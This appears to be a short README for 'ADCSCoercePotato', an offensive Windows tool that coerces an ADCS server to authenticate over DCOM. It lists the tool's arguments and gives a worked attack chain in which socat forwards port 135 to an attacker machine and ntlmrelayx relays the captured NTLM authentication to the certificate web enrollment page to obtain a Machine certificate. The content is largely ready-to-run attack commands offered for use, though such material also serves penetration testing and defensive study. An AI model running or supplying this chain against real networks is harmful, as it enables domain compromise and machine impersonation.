# ADCSCoercePotato
Yet another technique for coercing machine authentication but specific for ADCS server<br>
Full details: https://decoder.cloud/2024/02/26/hello-im-your-adcs-server-and-i-want-to-authenticate-against-you/
```
ADCSCoercePotato
- @decoder_it 2024

Mandatory args:
-u Domain Username
-p password
-d Domain Name
-m <host or IP> remote DCOM (ADCS) server address
-k <IP> redirector where socat and ntlmrelayx is running


Optional args:
-n <port> HTTP port where redirector (ntlmrelayx) is listening, default:80
-l <port> local socket server port, default:9999
-c <clsid> default:{D99E6E74-FC88-11D0-B498-00A0C90312F3}

Example: ADCSCoercePotato.exe -m 192.168.212.22 -k 192.168.1.88 -u myuser -p mypass -d mydomain.domain
         On the Linux box (assuming it has IP:192.168.1.88 and the Windows attacker machine is:192.168.1.89)
         and ADCS web enrollment service is also running on:192.168.212.41
         -> socat tcp -listen:135, reuseaddr, fork tcp:192.168.1.89:9999 &
         -> ntlmrelayx.py -t http://192.168.212.41/certsrv/certrqus.asp --adcs --template Machine -smb2support
